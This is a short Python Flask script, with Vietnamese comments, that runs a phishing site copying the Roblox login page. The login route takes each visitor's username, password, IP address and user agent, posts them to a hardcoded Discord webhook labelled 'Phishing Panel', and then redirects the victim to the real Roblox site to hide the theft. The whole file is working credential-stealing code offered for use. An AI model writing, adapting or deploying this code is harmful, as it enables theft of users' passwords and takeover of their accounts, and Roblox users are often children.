import os
import json
import requests
from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime

app = Flask(__name__)

# ===== DISCORD WEBHOOK (THAY BẰNG CỦA BẠN) =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532691636918812787/kY9rrENUhkJJJHA6fAEh0zLw24sM1kIqb8QiOp_HSVrtn0aObUC22gV5nH8M4pgbuh-9"

def send_discord(username, password, ip, user_agent):
    """Gửi thông tin đăng nhập về Discord"""
    embed = {
        "embeds": [{
            "title": "🎯 ROBLOX CREDENTIALS",
            "color": 0xff5500,
            "fields": [
                {"name": "👤 Username/Email", "value": username, "inline": True},
                {"name": "🔑 Password", "value": password, "inline": True},
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "📱 User-Agent", "value": user_agent[:100], "inline": False},
                {"name": "🕒 Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
            ],
            "footer": {"text": "Phishing Panel - Roblox Clone"}
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed)
        if r.status_code == 204:
            print("[+] Webhook sent.")
        else:
            print(f"[-] Webhook error: {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    # Gửi lên Discord
    send_discord(username, password, ip, ua)
    
    # Chuyển hướng đến Roblox thật
    return redirect('https://www.roblox.com/login')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
